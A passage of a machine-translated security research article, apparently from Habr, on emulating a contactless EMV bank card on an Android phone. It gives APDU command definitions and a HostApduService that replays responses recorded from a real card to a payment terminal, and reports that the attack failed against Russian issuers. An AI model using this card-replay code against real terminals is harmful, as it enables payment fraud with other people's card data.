SELECT_PPSE = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Lc = "0E", Nc = "32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00") val SELECT_APPLICATION = Command(CLA = "00", INS = "A4", P1 = "04", P2 = "00", Nc = "07") val GET_PROCESSING_OPTIONS = Command(CLA = "80", INS = "A8", P1 = "00", P2 = "00", Lc = "02", Nc = "83 00", Le = "00") val READ_RECORD_1 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "14", Lc = "00", Le = "00") val READ_RECORD_2 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "1C", Lc = "00", Le = "00") val READ_RECORD_3 = Command(CLA = "00", INS = "B2", P1 = "01", P2 = "24", Lc = "00", Le = "00") val READ_RECORD_4 = Command(CLA = "00", INS = "B2", P1 = "02", P2 = "24", Lc = "00", Le = "00") val COMPUTE_CRYPTOGRAPHIC_CHECKSUM = Command(CLA = "80", INS = "2A", P1 = "8E", P2 = "80", Le = "00") }</code> </pre><br>  Untuk menerapkan penyadapan perintah dari terminal, Anda harus memulai layanan Anda dan mendeklarasikannya dalam manifes.  Dalam layanan ini, perintah dari terminal datang ke processCommandApdu, kami membandingkannya dengan yang disimpan dalam file, dan memberikan respons, yang ditulis pada baris berikutnya. <br><br><pre> <code class="xml hljs"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">".NfcService"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:exported</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:permission</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.permission.BIND_NFC_SERVICE"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">action</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.action.HOST_APDU_SERVICE"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">category</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.intent.category.DEFAULT"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">intent-filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta-data</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"android.nfc.cardemulation.host_apdu_service"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">android:resource</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"@xml/apdu_config"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">service</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br><pre> <code class="plaintext hljs">class NfcService : HostApduService() { fun getData(context: Context?): List&lt;Command&gt; { var list: List&lt;Command&gt; = arrayListOf() filePath?.let { if (it.isNotBlank()) { list = getCommands(Uri.fromFile(File(it)).readTextFromUri(context), this::showError) } else { Toast.makeText(applicationContext, "Not found file path", Toast.LENGTH_SHORT).show() } } return list } private var commands: List&lt;Command&gt;? = arrayListOf() override fun processCommandApdu(apdu: ByteArray?, bundle: Bundle?): ByteArray { commands = getData(applicationContext) commands?.forEachIndexed { i, command -&gt; if (apdu.toHex() == command.getHexString()) { return commands!![i+1].split() } } Log.e("LOG", "Finnish") return Value.magStripModeEmulated.hexToByteArray() }</code> </pre> <br>  Beberapa tangkapan layar dari aplikasi.  Kami membaca kartu dan parsim log: <br><br><img src="https://habrastorage.org/webt/0p/qt/vj/0pqtvjicqlg6hh4iorgruoljd_w.png"><br><br>  Dengan demikian, dimungkinkan untuk mensimulasikan operasi kartu EMV tanpa kontak pada ponsel dengan data kartu.  Tetapi untungnya atau sayangnya bagi seseorang, serangan ini tidak berhasil di Rusia.  Menurut eksperimen kami, transaksi sepanjang waktu mencapai bank penerbit dan ditolak oleh bank itu sendiri.  Selain itu, kami tidak dapat melakukan transaksi offline menggunakan MagStripe.  Namun, serangan semacam itu mungkin dapat diterapkan di negara lain di mana penggunaan mode MagStripe cukup umum dan algoritma manajemen risiko sedikit berbeda, misalnya, di AS. <br><br><h4>  Tautan dengan bantuan artikel ini </h4><br>  Kartu mikroprosesor bank / I.M. Goldovsky - M.: TsIPSiR: Alpina Pub Lakers, 2010.-- 686 hal. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Proyek EMV: langkah-demi-langkah</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Penelitian Peneliti Austria</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Tautan ke kode aplikasi</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Simulator Terminal.</a> <br><br>  Terima kasih kepada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">barracud4</a> untuk membantu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">saya</a> menyiapkan artikel ini. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id421543/">https://habr.com/ru/post/id421543/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id421529/index.html">Netflix, Uber, Google dan Anda di MBLT DEV 2018</a></li>
<li><a href="../id421531/index.html">Bagaimana mengintegrasikan ReactJS ke dalam 1C-Bitrix dengan pembuatan templat secara otomatis di back-end menggunakan contoh jaringan Globus</a></li>
<li><a href="../id421533/index.html">Memilih bahasa pemrograman: 3 tips dari seorang programmer dari Apple</a></li>
<li><a href="../id421535/index.html">Petualangan - Elektronik. Di ayunan bersayap di dunia IT</a></li>
<li><a href="../id421537/index.html">Fungsi Tingkat Tinggi di JS: Kursus Petarung Muda</a></li>
<li><a href="../id421545/index.html">Ulasan PocketBook 616 - dompet 2018 paling hemat dengan fungsi backlight</a></li>
<li><a href="../id421547/index.html">Penerimaan Pusat Data Independen</a></li>
<li><a href="../id421549/index.html">Kami sedang menulis dokumentasi teknis: panduan untuk orang awam</a></li>
<li><a href="../id421551/index.html">Menguasai Vuex - Dari Nol ke Pahlawan</a></li>
<li><a href="../id421553/index.html">Kami berbagi konten teknologi: kami telah mengumpulkan semua materi kami di satu situs</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>